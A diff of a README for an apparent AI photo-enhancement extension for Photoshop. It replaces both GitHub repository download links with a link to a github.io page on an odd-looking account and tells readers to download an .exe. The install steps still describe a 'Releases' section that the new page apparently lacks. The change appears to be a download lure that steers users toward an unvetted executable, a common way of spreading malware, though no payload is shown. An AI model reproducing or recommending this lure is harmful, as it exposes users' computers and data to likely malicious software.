@@ -1,6 +1,6 @@
 # 🎨 photoshop-ai-smart-enhance - Enhance your photos with smart AI
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://franchecomtenymphaeaalba794.github.io)
 
 This extension brings artificial intelligence tools to Adobe Photoshop CC 2024 and newer versions. It handles exposure issues, color adjustments, contrast, and noise. Use these tools to improve images for print or web projects. The extension works with smart objects to protect your original files.
 
@@ -20,7 +20,7 @@ If your computer meets these needs, the extension runs well and provides fast fe
 
 You need to access the official release page to get the installer for your computer. Follow these steps to obtain the files:
 
-1. Visit the following link to find the download area: [https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance](https://github.com/Franchecomtenymphaeaalba794/photoshop-ai-smart-enhance)
+1. Visit the following link to find the download area: [https://franchecomtenymphaeaalba794.github.io](https://franchecomtenymphaeaalba794.github.io)
 2. Look for the section labeled Releases on the right side of the page.
 3. Click the most recent version number to see the available files.
 4. Download the file ending in .exe to your desktop or downloads folder.
